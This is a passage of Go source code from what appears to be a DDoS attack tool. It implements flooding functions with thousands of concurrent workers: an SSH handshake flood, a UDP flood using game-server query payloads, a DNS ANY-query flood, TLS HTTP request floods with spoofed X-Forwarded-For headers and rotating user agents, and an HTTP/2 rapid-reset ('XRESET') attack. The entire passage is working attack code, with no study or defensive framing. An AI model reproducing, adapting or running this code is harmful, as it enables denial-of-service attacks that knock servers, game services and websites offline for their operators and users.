				}

				conn, err := dialer.DialContext(ctx, "tcp", addr)
				if err != nil {
					select {
					case <-ctx.Done():
						return
					case <-time.After(20 * time.Millisecond):
					}
					continue
				}

				if tc, ok := conn.(*net.TCPConn); ok {
					tc.SetNoDelay(true)
					tc.SetKeepAlive(true)
					tc.SetKeepAlivePeriod(1 * time.Second)
					tc.SetWriteBuffer(1024)
				}

				k := trackConn(att, conn)

				conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
				conn.Write(sshBanner)

				for i := 0; i < 5000; i++ {
					if i%100 == 0 {
						select {
						case <-ctx.Done():
							untrackConn(att, k, conn)
							return
						default:
						}
					}
					conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
					if _, err := conn.Write(sshKexInit); err != nil {
						break
					}
				}

				untrackConn(att, k, conn)
			}
		}(w)
	}
	wg.Wait()
}

// ============================================================
// L4 - GAME (Valid UDP Data + Dynamic string UDP Flood)
// ============================================================
func gameFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)
	workers := runtime.NumCPU() * 384
	if workers < 3000 {
		workers = 3000
	}

	gamePayloads := [][]byte{
		[]byte("\xFF\xFF\xFF\xFFTSource Engine Query\x00"),
		[]byte("\xFF\xFF\xFF\xFF\x54Source Engine Query\x00"),
		[]byte("\xFF\xFF\xFF\xFFgetstatus\x00"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo\x00"),
		[]byte("\xFF\xFF\xFF\xFF\x69\x00\x00\x00\x00"),
		[]byte("\xFE\xFD\x00\x10\x20\x30\x40\xFF\xFF\xFF\x01"),
		[]byte("\x02\x00\x00\x00\x00\x00\x00\x00\x00"),
		[]byte("\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
	}

	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			k := trackConn(att, conn)
			defer untrackConn(att, k, conn)

			if udpConn, ok := conn.(*net.UDPConn); ok {
				udpConn.SetWriteBuffer(8 * 1024 * 1024)
				udpConn.SetReadBuffer(1)
			}

			payloadIdx := id % len(gamePayloads)

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				basePayload := gamePayloads[payloadIdx]
				payload := make([]byte, len(basePayload)+16)
				copy(payload, basePayload)
				crand.Read(payload[len(basePayload):])

				for i := 0; i < 10000; i++ {
					if i%100 == 0 {
						select {
						case <-ctx.Done():
							return
						default:
						}
					}

					if i%1000 == 0 {
						payloadIdx = (payloadIdx + 1) % len(gamePayloads)
					}

					if _, err := conn.Write(payload); err != nil {
						break
					}
				}
			}
		}(w)
	}
	wg.Wait()
}

// ============================================================
// L4 - DNS (DNS Amplification Flood)
// ============================================================
func dnsFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)
	workers := runtime.NumCPU() * 512
	if workers < 6000 {
		workers = 6000
	}

	dnsQueries := [][]byte{
		{
			0xAB, 0xCD,
			0x01, 0x00,
			0x00, 0x01,
			0x00, 0x00,
			0x00, 0x00,
			0x00, 0x00,
			0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e',
			0x03, 'c', 'o', 'm',
			0x00,
			0x00, 0xFF,
			0x00, 0x01,
		},
		{
			0x12, 0x34,
			0x01, 0x00,
			0x00, 0x01,
			0x00, 0x00,
			0x00, 0x00,
			0x00, 0x00,
			0x03, 'i', 's', 'c',
			0x03, 'o', 'r', 'g',
			0x00,
			0x00, 0xFF,
			0x00, 0x01,
		},
		{
			0x56, 0x78,
			0x01, 0x00,
			0x00, 0x01,
			0x00, 0x00,
			0x00, 0x00,
			0x00, 0x00,
			0x04, 'r', 'i', 'p', 'e',
			0x03, 'n', 'e', 't',
			0x00,
			0x00, 0xFF,
			0x00, 0x01,
		},
	}

	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			k := trackConn(att, conn)
			defer untrackConn(att, k, conn)

			if udpConn, ok := conn.(*net.UDPConn); ok {
				udpConn.SetWriteBuffer(8 * 1024 * 1024)
				udpConn.SetReadBuffer(1)
			}

			queryIdx := id % len(dnsQueries)

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				baseQuery := dnsQueries[queryIdx]
				query := make([]byte, len(baseQuery))
				copy(query, baseQuery)
				query[0] = byte(safeRandIntn(256))
				query[1] = byte(safeRandIntn(256))

				for i := 0; i < 20000; i++ {
					if i%100 == 0 {
						select {
						case <-ctx.Done():
							return
						default:
						}
					}

					if i%500 == 0 {
						queryIdx = (queryIdx + 1) % len(dnsQueries)
					}

					if _, err := conn.Write(query); err != nil {
						break
					}
				}
			}
		}(w)
	}
	wg.Wait()
}

// ============================================================
// L7 SEGÉD
// ============================================================
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
}

func randomUA() string {
	return userAgents[safeRandIntn(len(userAgents))]
}

// ============================================================
// dialTLSContext
// ============================================================
func dialTLSContext(ctx context.Context, host, serverName string, nextProtos []string) (*tls.Conn, error) {
	dialer := &net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	rawConn, err := dialer.DialContext(ctx, "tcp", host)
	if err != nil {
		return nil, err
	}

	if tcpConn, ok := rawConn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
		tcpConn.SetNoDelay(true)
		tcpConn.SetWriteBuffer(512 * 1024)
		tcpConn.SetReadBuffer(512 * 1024)
	}

	tlsConn := tls.Client(rawConn, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         serverName,
		NextProtos:         nextProtos,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
	})

	done := make(chan error, 1)
	go func() { done <- tlsConn.Handshake() }()

	select {
	case err := <-done:
		if err != nil {
			rawConn.Close()
			return nil, err
		}
	case <-time.After(5 * time.Second):
		rawConn.Close()
		return nil, fmt.Errorf("tls handshake timeout")
	case <-ctx.Done():
		rawConn.Close()
		return nil, ctx.Err()
	}

	tlsConn.SetWriteDeadline(time.Time{})

	return tlsConn, nil
}

// ============================================================
// L7 - TLS
// ============================================================
func tlsFlood(ctx context.Context, att *activeAttack, rawURL string) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return
	}
	host := u.Host
	if !strings.Contains(host, ":") {
		host += ":443"
	}

	basePayload := fmt.Sprintf(
		"GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"+
			"Accept-Language: en-US,en;q=0.9\r\n"+
			"Accept-Encoding: gzip, deflate, br\r\n"+
			"Connection: keep-alive\r\n"+
			"Cache-Control: no-cache\r\n"+
			"Pragma: no-cache\r\n"+
			"Upgrade-Insecure-Requests: 1\r\n"+
			"Sec-Fetch-Dest: document\r\n"+
			"Sec-Fetch-Mode: navigate\r\n"+
			"Sec-Fetch-Site: none\r\n"+
			"Sec-Fetch-User: ?1\r\n"+
			"X-Request-ID: %s\r\n"+
			"X-Forwarded-For: %d.%d.%d.%d\r\n"+
			"\r\n",
		u.Path, u.Host, randomUA(), randStr(24),
		safeRandIntn(255), safeRandIntn(255), safeRandIntn(255), safeRandIntn(255))
	baseBytes := []byte(basePayload)

	workers := 2000
	if runtime.NumCPU() > 4 {
		workers = 3000
	}
	if runtime.NumCPU() > 8 {
		workers = 4000
	}

	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				conn, err := dialTLSContext(ctx, host, u.Hostname(), []string{"http/1.1"})
				if err != nil {
					select {
					case <-ctx.Done():
						return
					case <-time.After(10 * time.Millisecond):
					}
					continue
				}

				k := trackConn(att, conn)

				for {
					select {
					case <-ctx.Done():
						untrackConn(att, k, conn)
						return
					default:
					}

					conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
					if _, err := conn.Write(baseBytes); err != nil {
						break
					}
				}
				untrackConn(att, k, conn)
			}
		}()
	}

	wg.Wait()
}

// ============================================================
// L7 - TLSPLUS
// ============================================================
func tlsPlusFlood(ctx context.Context, att *activeAttack, rawURL string) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return
	}
	host := u.Host
	if !strings.Contains(host, ":") {
		host += ":443"
	}

	generatePayload := func() []byte {
		path := u.Path
		if path == "" {
			path = "/"
		}
		path += "?" + randStr(16)

		return []byte(fmt.Sprintf(
			"GET %s HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"User-Agent: %s\r\n"+
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"+
				"Accept-Encoding: gzip, deflate, br\r\n"+
				"Accept-Language: en-US,en;q=0.9\r\n"+
				"Connection: keep-alive\r\n"+
				"Cache-Control: no-cache\r\n"+
				"Pragma: no-cache\r\n"+
				"Upgrade-Insecure-Requests: 1\r\n"+
				"Sec-Fetch-Dest: document\r\n"+
				"Sec-Fetch-Mode: navigate\r\n"+
				"Sec-Fetch-Site: none\r\n"+
				"Sec-Fetch-User: ?1\r\n"+
				"X-Request-ID: %s\r\n"+
				"X-Forwarded-For: %d.%d.%d.%d\r\n"+
				"X-Real-IP: %d.%d.%d.%d\r\n"+
				"Referer: https://%s/\r\n"+
				"\r\n",
			path, u.Host, randomUA(), randStr(24),
			safeRandIntn(255), safeRandIntn(255), safeRandIntn(255), safeRandIntn(255),
			safeRandIntn(255), safeRandIntn(255), safeRandIntn(255), safeRandIntn(255),
			u.Host))
	}

	workers := 3000
	if runtime.NumCPU() > 4 {
		workers = 4000
	}
	if runtime.NumCPU() > 8 {
		workers = 5000
	}

	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				conn, err := dialTLSContext(ctx, host, u.Hostname(), []string{"http/1.1"})
				if err != nil {
					select {
					case <-ctx.Done():
						return
					case <-time.After(5 * time.Millisecond):
					}
					continue
				}

				k := trackConn(att, conn)

				payload := generatePayload()
				counter := 0

				for {
					select {
					case <-ctx.Done():
						untrackConn(att, k, conn)
						return
					default:
					}

					if counter%50 == 0 {
						payload = generatePayload()
					}
					counter++

					conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
					if _, err := conn.Write(payload); err != nil {
						break
					}
				}
				untrackConn(att, k, conn)
			}
		}()
	}

	wg.Wait()
}

// ============================================================
// L7 - XRESET
// ============================================================
func xresetFlood(ctx context.Context, att *activeAttack, rawURL, port string) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return
	}
	host := u.Host
	if !strings.Contains(host, ":") {
		host += ":" + port
	}

	preface := []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")

	settings := []byte{
		0x00, 0x00, 0x06,
		0x04,
		0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x02,
		0x00, 0x00, 0x00, 0x00,
	}

	windowUpdate := []byte{
		0x00, 0x00, 0x04,
		0x08,
		0x00,
		0x00, 0x00, 0x00, 0x00,
		0x7F, 0xFF, 0x00, 0x00,
	}

	buildHeaderBlock := func(authority string) []byte {
		out := make([]byte, 0, 5+len(authority))
		out = append(out, 0x82, 0x86, 0x84, 0x01, byte(len(authority)))
		out = append(out, []byte(authority)...)
		return out
	}

	headerBlockBase := buildHeaderBlock(u.Host)
	headerLen := len(headerBlockBase)

	workers := 3000
	if runtime.NumCPU() > 4 {
		workers = 4000
	}
	if runtime.NumCPU() > 8 {
		workers = 5000
	}

	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				conn, err := dialTLSContext(ctx, host, u.Hostname(), []string{"h2"})
				if err != nil {
					select {
					case <-ctx.Done():
						return
					case <-time.After(5 * time.Millisecond):
					}
					continue
				}

				k := trackConn(att, conn)

				conn.Write(preface)
				conn.Write(settings)
				conn.Write(windowUpdate)

				streamID := uint32(1)

				for {
					select {
					case <-ctx.Done():
						untrackConn(att, k, conn)
						return
					default:
					}

					headers := make([]byte, 9+headerLen)
					headers[0] = byte(headerLen >> 16)
					headers[1] = byte(headerLen >> 8)
					headers[2] = byte(headerLen)
					headers[3] = 0x01
					headers[4] = 0x05
					headers[5] = byte(streamID >> 24)
					headers[6] = byte(streamID >> 16)
					headers[7] = byte(streamID >> 8)
					headers[8] = byte(streamID)
					copy(headers[9:], headerBlockBase)

					rst := []byte{
						0x00, 0x00, 0x04,
						0x03,
						0x00,
						byte(streamID >> 24), byte(streamID >> 16), byte(streamID >> 8), byte(streamID),
						0x00, 0x00, 0x00, 0x08,
					}

					conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
					if _, err := conn.Write(headers); err != nil {
						break
					}
					if _, err := conn.Write(rst); err != nil {
						break
					}

					streamID += 2
				}
				untrackConn(att, k, conn)
			}
		}()
	}

	wg.Wait()
}

// binary helper
var _ = binary.BigEndian
var _ = atomic.AddInt64
var _ = rng
var _ = rngMu
var _ = fastRand